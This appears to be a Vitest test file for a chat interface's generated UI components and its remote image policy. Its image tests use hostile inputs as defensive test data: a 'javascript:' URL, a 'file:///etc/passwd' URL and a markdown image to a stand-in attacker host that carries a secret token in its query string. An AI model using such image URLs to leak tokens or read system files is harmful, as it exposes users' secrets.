// Every Generated UI component renders from a program, and remote images
// follow the workspace policy.
import { afterEach, describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";
import { CHAT_MD_PLUGINS, mdComponents } from "../markdown";
import { applyWorkspaceIdentity, clearWorkspaceIdentity } from "../../lib/workspace-store";
import { GenuiHostContext } from "./actions";
import { imageSource } from "./image";

const md = (text: string) =>
  renderToStaticMarkup(
    <GenuiHostContext.Provider value={{ send: () => {} }}>
      <Markdown remarkPlugins={CHAT_MD_PLUGINS} components={mdComponents}>
        {text}
      </Markdown>
    </GenuiHostContext.Provider>,
  );

const block = (...lines: string[]) => md(["```openui", ...lines, "```"].join("\n"));

afterEach(() => clearWorkspaceIdentity());

describe("the full component set", () => {
  it("renders structure, media, records and code", () => {
    const html = block(
      "root = Stack([acc, steps, people, code, more, car, follow])",
      'acc = Accordion([AccordionItem("Details", [Text("Hidden detail")], true)])',
      'steps = Steps([Step("Draft", "Written", "done"), Step("Review", null, "current"), Step("Ship")])',
      'people = EntityList([Entity("Ada", "Engineer", "since 2021", null, ["core"])])',
      'code = CodeBlock("const x = 1;", "ts", "example.ts")',
      'more = Modal("Show more", "More", [Text("Inside the dialog")])',
      'car = Carousel([Card([Text("Slide one")], "One"), Card([Text("Slide two")], "Two")])',
      'follow = FollowUps(["Why?", "What next?"])',
    );
    for (const text of ["Details", "Hidden detail", "Draft", "Review", "Ship", "Ada", "since 2021", "core"]) {
      expect(html).toContain(text);
    }
    expect(html).toContain("example.ts");
    expect(html).toContain("Show more");
    expect(html).toContain("Slide two");
    expect(html).toContain("What next?");
  });

  it("renders the extra charts", () => {
    const html = block(
      "root = Stack([bar, scatter, radar, radial, stacked])",
      'bar = BarChart(["Alpha", "Beta"], [Series("n", [1, 2])], false, true)',
      'scatter = ScatterChart([ScatterSeries("pts", [[1, 2], [3, 4]])], "x", "y")',
      'radar = RadarChart(["a", "b", "c"], [Series("s", [1, 2, 3])])',
      'radial = RadialChart(["Done"], [70])',
      'stacked = StackedBar(["Paid", "Free"], [30, 70])',
    );
    expect(html).toContain("Paid");
    expect(html).toContain("(30%)");
    expect(html).toContain("(70%)");
  });

  it("renders every form input", () => {
    const html = block(
      "root = Stack([form])",
      'form = Form("f", [r, cb, sw, sl, dp, oc, ch, et], Buttons([Button("Send", @ToAssistant("Send"))]))',
      'r = Field("Size", RadioGroup("size", ["S", "M", "L"], null, "M"))',
      'cb = Field("Extras", CheckBoxGroup("extras", ["Cheese", "Ham"]))',
      'sw = Field("Gift", Switch("gift", "Gift wrap", true))',
      'sl = Field("Budget", Slider("budget", 0, 100, 5, 40, "EUR"))',
      'dp = Field("When", DatePicker("when", "date"))',
      'oc = Field("Plan", OptionCards("plan", [OptionCard("pro", "Pro", "Everything")]))',
      'ch = Field("Tags", Chips("tags", ["red", "blue"], true))',
      'et = Field("Items", EditableTable("items", ["Name", "Qty"], [["Milk", 2]], true))',
    );
    for (const text of [
      "Size",
      "Cheese",
      "Gift wrap",
      "40 EUR",
      'type="date"',
      "Everything",
      "blue",
      "Milk",
      "Add row",
    ]) {
      expect(html).toContain(text);
    }
    expect(html).toMatch(/type="radio"[^>]*checked=""[^>]*\/?>M|checked=""[^>]*type="radio"/);
  });
});

describe("images", () => {
  it("classifies sources", () => {
    expect(imageSource("attachment:0199a3b0-0000-7000-8000-000000000001").kind).toBe("attachment");
    expect(imageSource("/api/v1/attachments/0199a3b0-0000-7000-8000-000000000001").kind).toBe("attachment");
    expect(imageSource("data:image/png;base64,AAAA").kind).toBe("inline");
    expect(imageSource("https://example.com/a.png").kind).toBe("remote");
    expect(imageSource("javascript:alert(1)").kind).toBe("none");
    expect(imageSource("file:///etc/passwd").kind).toBe("none");
  });

  const IMG = 'root = Stack([Image("https://example.com/cat.png", "A cat")])';

  it("loads remote images when the workspace allows it (the default)", () => {
    const html = block(IMG);
    expect(html).toContain('src="https://example.com/cat.png"');
    expect(html).toContain('referrerPolicy="no-referrer"');
  });

  it("waits for a click under the click policy", () => {
    applyWorkspaceIdentity({ name: "w", telemetry: false, remote_images: "click" });
    const html = block(IMG);
    expect(html).not.toContain("<img");
    expect(html).toContain("Load image: A cat");
    expect(html).toContain("https://example.com/cat.png");
  });

  it("never loads under the never policy, in markdown too", () => {
    applyWorkspaceIdentity({ name: "w", telemetry: false, remote_images: "never" });
    expect(block(IMG)).not.toContain("<img");
    expect(block(IMG)).toContain("https://example.com/cat.png");
    const leak = md("![A cat](https://evil.example/p.png?d=secret-token)");
    expect(leak).not.toContain("<img");
    expect(leak).toContain("https://evil.example/p.png?d=secret-token");
  });

  it("always shows inline images", () => {
    applyWorkspaceIdentity({ name: "w", telemetry: false, remote_images: "never" });
    expect(block('root = Stack([Image("data:image/png;base64,iVBORw0KGgo=", "dot")])')).toContain(
      'src="data:image/png;base64,iVBORw0KGgo="',
    );
  });
});
